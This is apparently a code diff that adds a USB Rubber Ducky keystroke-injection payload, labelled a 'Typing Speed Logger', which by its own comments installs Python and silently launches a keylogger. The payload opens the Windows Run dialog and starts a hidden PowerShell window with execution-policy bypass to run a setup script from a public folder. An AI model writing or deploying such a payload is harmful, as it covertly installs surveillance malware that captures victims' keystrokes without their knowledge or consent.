@@ -1,0 +1,12 @@
+REM =============================================
+REM  Typing Speed Logger - Ducky Payload
+REM  Auto-installs Python + all dependencies
+REM  then launches the keylogger silently
+REM =============================================
+
+DELAY 2000
+
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Users\Public\setup.ps1"
+ENTER
